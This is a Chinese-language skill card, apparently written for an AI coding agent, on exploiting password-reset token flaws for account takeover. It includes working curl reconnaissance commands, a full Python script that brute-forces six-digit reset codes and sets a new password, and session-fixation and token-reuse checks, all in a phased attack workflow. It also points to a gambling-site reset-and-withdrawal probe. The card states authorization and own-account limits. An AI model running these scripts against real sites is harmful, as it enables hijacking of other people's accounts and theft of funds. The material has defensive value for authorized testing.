---
name: 夺舍·票面
category: authentication
priority: P1
description: >-
  授权目标上密码重置 Token 面：查询串 token、长度过短、重置页挂广告追踪、Session Fixation。
  HITCON 重置 token 外泄、金鑰空間縮減、Session Fixation 同类。默认不提交邮箱发信。
metadata:
  tags:
    - password-reset
    - token-leak
    - session-fixation
    - ato
    - brute-force
    - referrer-leak
    - short-key
    - forgot-password
    - hitcon
    - enumeration
  score: 6
  version: "2.0"
  updated: "2026-09-04"
---

> **秦百胜**
> 历经五十四次劫，劫云仍旧漫遮天。
> 胸中魂光压众生，拳里剑气纵北原。
> 时来时去四百载，无死何能生新颜？
> 弃此残躯换清风，卷席苍穹复光年！

# 重置 Token / 短密钥 ATO 面（Cursor Skill · score≥5 实战级）

> **定位**：侦察并利用密码重置流程中的 token 外泄、熵不足、Session Fixation 等缺陷，
> 实现 ATO（Account Takeover）。覆盖 HITCON ZeroDay 同类披露的「重置 token 外泄」
> 和「金鑰空間縮減」手法。

---

## 0. 硬闸

1. 目标必须在 `授权范围`。
2. **默认不提交邮箱发信**——只分析已有的重置页面和 token 格式。
3. 只动自己注册的号；打他人号先问。
4. 不改原超管密码。

---

## 1. 真源 & 关联

| 资料 | 路径 |
|------|------|
| Playbook（主） | `传承/夺舍·短票.md` |
| Playbook（辅） | `传承/夺舍·重置.md` |
| 探针 | `炼蛊房/reset_token_surface_probe.py` |
| ATO 探针 | `炼蛊房/ato_reset_withdraw_probe.py` |
| 上游 | `account-takeover-chain`（ATO 总链） |
| 下游 | `gambling-password-reset-ato`（博彩专项） |
| 横切 | `2fa-bypass`、`session-fixation`（如有） |

---

## 2. 攻击面分类

### 2.1 Token 外泄渠道

| # | 渠道 | 原理 | 危害 |
|---|------|------|------|
| T1 | Referer 泄露 | 重置页加载第三方资源（广告/追踪），token 随 Referer 发给第三方 | 第三方可收割 token |
| T2 | URL 参数泄露 | token 在 GET 参数中，记入 access log / proxy log / 浏览器历史 | 共享电脑 / 日志审计可提取 |
| T3 | CORS 反射 | 重置页 Origin 反射 + `credentials: include`，可跨域读 token | XSS → ATO |
| T4 | 响应体泄露 | 重置请求的 JSON 响应直接返回 token（前端便利） | 无需邮箱即可拿 token |
| T5 | 缓存泄露 | 重置页 `Cache-Control` 缺失，CDN/代理缓存带 token 页面 | 任何人可访问缓存 URL |

### 2.2 Token 熵不足

| # | 缺陷 | 特征 | 利用方式 |
|---|------|------|----------|
| E1 | 纯数字短码 | 4-6 位纯数字 | 直接爆破（10^4 ~ 10^6） |
| E2 | 时间戳种子 | token = md5(timestamp + userId) | 知道请求时间可碰撞 |
| E3 | 递增 ID | token = base64(autoIncrement) | 枚举相邻 ID |
| E4 | 可预测 UUID | UUIDv1（含 MAC + 时间） | 知道 MAC 可推算 |
| E5 | 固定前缀/后缀 | 所有 token 共享前 N 位 | 减少爆破空间 |

### 2.3 Session Fixation

| # | 场景 | 利用 |
|---|------|------|
| S1 | 重置链接不刷新 Session ID | 攻击者种 cookie → 受害者点重置链 → 攻击者沿用同 session |
| S2 | 重置后不废旧 token | 同一 token 可反复使用 |
| S3 | 重置后不注销旧 session | 改密后旧 session 仍有效 |

---

## 3. 实战命令

### 3.1 一键探针

```bash
# 自动化探测重置面
python3 炼蛊房/reset_token_surface_probe.py \
  --base https://授权站 --case <案卷>

# 博彩站重置 code 可空/任意（只打自己注册的号）
python3 炼蛊房/ato_reset_withdraw_probe.py dummy-reset \
  --base https://授权站 --case <案卷> \
  --token "$T" --self-user SELF --new-password 'SelfOnly1!'
```

### 3.2 重置页面侦察

```bash
# ── 找忘记密码入口 ──
curl -sk "https://TARGET/forgot-password" -o /dev/null -w '%{http_code}\n'
curl -sk "https://TARGET/api/auth/forgot-password" -o /dev/null -w '%{http_code}\n'
curl -sk "https://TARGET/api/v1/user/resetPassword" -o /dev/null -w '%{http_code}\n'
curl -sk "https://TARGET/api/member/auth/reset-password" -o /dev/null -w '%{http_code}\n'
curl -sk "https://TARGET/password/reset" -o /dev/null -w '%{http_code}\n'

# ── 测试重置请求是否返回 token（T4 响应体泄露）──
curl -sk "https://TARGET/api/auth/forgot-password" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"self@test.com"}' | python3 -m json.tool
# 看 JSON 有无 token / code / resetToken 字段

curl -sk "https://TARGET/api/v1/user/sendResetCode" \
  -X POST -H "Content-Type: application/json" \
  -d '{"mobile":"自己手机号"}' | python3 -m json.tool
```

### 3.3 Token 格式分析

```bash
# ── 拿到 token 后分析格式和熵 ──
TOKEN="从邮件/响应中获取的token"

# 长度检查
echo -n "$TOKEN" | wc -c
# < 16 字符 → 熵不足（E1/E5）

# 字符集检查
echo "$TOKEN" | grep -oP '[^a-zA-Z0-9]' | sort -u
# 纯数字？纯小写？有特殊字符？

# Base64 解码尝试
echo "$TOKEN" | base64 -d 2>/dev/null | xxd | head

# MD5/SHA 格式检查（32/40/64 hex）
echo -n "$TOKEN" | wc -c | grep -E '^(32|40|64)$'

# UUID 版本检查
echo "$TOKEN" | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-([1-5])[0-9a-f]{3}-' \
  | head -1
# 第 3 段首字符 = UUID 版本；v1 = 时间可预测
```

### 3.4 Referer 泄露检测（T1）

```bash
# ── 检查重置页是否加载第三方资源 ──
curl -sk "https://TARGET/reset-password?token=TESTTOKEN123" \
  | grep -oiP '(src|href)="https?://[^"]*"' \
  | grep -v "TARGET" \
  | sort -u
# 任何第三方域名 = token 随 Referer 泄露

# ── 检查 Referrer-Policy 头 ──
curl -sk -I "https://TARGET/reset-password?token=TESTTOKEN123" \
  | grep -i 'referrer-policy'
# 无该头 或 值为 unsafe-url / no-referrer-when-downgrade → 泄露

# ── 检查 meta 标签 ──
curl -sk "https://TARGET/reset-password?token=TESTTOKEN123" \
  | grep -i 'referrer'
```

### 3.5 Token 爆破/碰撞（E1 熵不足）

```python
#!/usr/bin/env python3
"""reset_token_brute.py - 重置 token 短码爆破（仅用于自己注册的账号）"""
import requests, sys, itertools, string

BASE = sys.argv[1]  # https://target
ENDPOINT = "/api/auth/reset-password"  # 或 /api/v1/user/resetPassword
CHARSET = string.digits  # 纯数字短码
LENGTH = 6  # token 长度

session = requests.Session()
session.verify = False

count = 0
for combo in itertools.product(CHARSET, repeat=LENGTH):
    token = ''.join(combo)
    count += 1
    if count % 1000 == 0:
        print(f"[*] Tried {count}...", flush=True)

    r = session.post(f"{BASE}{ENDPOINT}", json={
        "token": token,
        "newPassword": "SelfTestOnly1!"
    }, timeout=10)

    if r.status_code == 200 and "success" in r.text.lower():
        print(f"[+] Valid token: {token}")
        print(f"[+] Response: {r.text[:200]}")
        break

    # 检查限速
    if r.status_code == 429:
        print(f"[!] Rate limited at attempt {count}")
        break
else:
    print(f"[-] Exhausted {count} attempts")
```

### 3.6 Session Fixation 检测

```bash
# ── 步骤 1：获取初始 session ──
curl -sk -c /tmp/sf_cookies.txt "https://TARGET/login" -o /dev/null
SESS_BEFORE=$(grep -oP 'JSESSIONID\s+\K\S+|PHPSESSID\s+\K\S+|session_id\s+\K\S+' /tmp/sf_cookies.txt)
echo "Before reset: $SESS_BEFORE"

# ── 步骤 2：提交重置请求（用自己的号） ──
curl -sk -b /tmp/sf_cookies.txt -c /tmp/sf_cookies2.txt \
  "https://TARGET/api/auth/reset-password" \
  -X POST -H "Content-Type: application/json" \
  -d '{"token":"自己的TOKEN","newPassword":"NewSelf123!"}' \
  -o /dev/null

SESS_AFTER=$(grep -oP 'JSESSIONID\s+\K\S+|PHPSESSID\s+\K\S+|session_id\s+\K\S+' /tmp/sf_cookies2.txt)
echo "After reset: $SESS_AFTER"

# ── 判断 ──
if [ "$SESS_BEFORE" = "$SESS_AFTER" ]; then
  echo "[!] Session ID unchanged after password reset → Session Fixation risk"
else
  echo "[+] Session rotated after reset"
fi
```

### 3.7 重置 Token 复用检测

```bash
# ── 用同一 token 连续重置两次 ──
TOKEN="自己获取的重置TOKEN"

# 第一次
curl -sk "https://TARGET/api/auth/reset-password" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"First123!\"}" \
  -w '\nHTTP %{http_code}\n'

# 第二次（同 token）
curl -sk "https://TARGET/api/auth/reset-password" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Second456!\"}" \
  -w '\nHTTP %{http_code}\n'

# 两次都 200 → token 未一次性失效 → S2
```

### 3.8 重置后旧 Session 检测

```bash
# ── 重置密码前先拿到一个有效 session ──
OLD_TOKEN="登录后的JWT或SessionCookie"

# 重置密码（用自己的号）
curl -sk "https://TARGET/api/auth/reset-password" \
  -X POST -H "Content-Type: application/json" \
  -d '{"token":"RESET_TOKEN","newPassword":"NewPass789!"}'

# 用旧 session 访问受保护资源
curl -sk "https://TARGET/api/user/profile" \
  -H "Authorization: Bearer $OLD_TOKEN" \
  -w '\nHTTP %{http_code}\n'
# 200 → 改密后旧 session 仍有效 → S3
```

---

## 4. 完整打击流程

```
Phase-0 侦察
│ 找忘记密码入口（3.2 命令）
│ 确认重置机制类型（邮件/短信/安全问题）
│
Phase-1 Token 格式分析
│ 获取自己账号的重置 token
│ 分析长度、字符集、编码、可预测性（3.3）
│ 判断熵是否足够
│
Phase-2 泄露面检测
│ Referer 泄露（3.4）
│ 响应体泄露（3.2 T4）
│ 缓存泄露（检查 Cache-Control）
│ CORS 反射（GET /reset?token=X，看 ACAO 头）
│
Phase-3 利用
│ 熵不足 → 爆破/碰撞（3.5，只打自己的号）
│ Referer 泄露 → 构造 PoC 页面引用第三方追踪
│ 响应体泄露 → 直接用返回的 token 重置
│
Phase-4 Session 链
│ Session Fixation（3.6）
│ Token 复用（3.7）
│ 旧 Session 存活（3.8）
│
Phase-5 证据固化
│ 截图/响应保存到 案卷/<案>/接管/
│ 更新 STATUS.md
```

---

## 5. 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| L1 指纹 | 忘记密码/重置页存在 | 404 / 无重置功能 |
| L2 面确认 | JS 查询串含 token + 长度 <16，或重置页挂追踪且无 Referrer-Policy，或响应直接返回 token | 只发现 /forgot-password 页面存在 |
| L3 ATO | 用泄露/短 token 成功重置自己账号密码 | 先问；只动自己的号；打他人号必须授权 |

---

## 6. Token 安全评估矩阵

| 检查项 | 安全 | 不安全 |
|--------|------|--------|
| 长度 | ≥32 字符 | <16 字符 |
| 字符集 | 大小写 + 数字 + 特殊 | 纯数字 |
| 有效期 | ≤15 分钟 | >1 小时或永不过期 |
| 一次性 | 使用后立即失效 | 可反复使用 |
| 传输方式 | POST body / Fragment | GET 参数 |
| Referrer-Policy | no-referrer / same-origin | 无或 unsafe-url |
| 响应体 | 不返回 token | 返回完整 token |
| 速率限制 | 5 次/分钟锁定 | 无限制 |
| Session 轮转 | 重置后换 session | 不换 |

---

## 7. 上下游 Skill

| 方向 | Skill | 说明 |
|------|-------|------|
| 上游 | `account-takeover-chain` | ATO 总链路由 |
| 上游 | `case-triage` | 定级后分发 |
| 下游 | `gambling-password-reset-ato` | 博彩站重置专项 |
| 下游 | `2fa-bypass` | 重置后二次验证绕过 |
| 横切 | `xss-testing` | XSS + Referer 泄露组合 |
| 横切 | `cors-exploitation` | CORS 反射读 token |
| 横切 | `web-cache-poisoning` | 缓存泄露 token |
| 横切 | `open-redirect-chain` | 重定向 + Referer 泄露 |
| 工具 | `炼蛊房/reset_token_surface_probe.py` | 自动化探针 |
| 工具 | `炼蛊房/ato_reset_withdraw_probe.py` | ATO + 提现探针 |

---

## 8. FAQ

1. **Q: 需要发邮件触发重置吗？**
   A: 默认不发信。先侦察页面和接口是否存在；响应体泄露（T4）不需要收邮件。需要发信时用自己注册的邮箱。

2. **Q: 6 位纯数字验证码能爆破吗？**
   A: 理论 10^6 = 100 万次。看速率限制：无限制则可行（几分钟）；有限制则结合时间窗口碰撞。

3. **Q: 和 `gambling-password-reset-ato` 什么关系？**
   A: 本卡是通用重置 token 面，`gambling-password-reset-ato` 是博彩站专项（resetPassword code 可空/任意）。博彩站先走那个卡。

4. **Q: HITCON ZeroDay 上报这类？**
   A: 是。HITCON 同类：重置 token 外泄（T1/T2/T4）和金鑰空間縮減（E1-E5）。写卡走 `hitcon-zeroday-intel`。
